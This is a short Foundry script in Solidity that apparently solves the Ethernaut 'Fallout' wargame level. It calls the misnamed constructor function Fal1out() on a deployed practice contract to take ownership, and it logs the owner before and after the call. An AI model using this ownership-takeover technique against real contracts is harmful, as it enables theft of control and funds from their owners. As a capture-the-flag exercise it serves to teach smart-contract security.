// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(0xB42a2962fbBd3B224D4F58C053c149c4Af69932b);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("Owner after: ", falloutInstance.owner());
        
        vm.stopBroadcast();
    }
}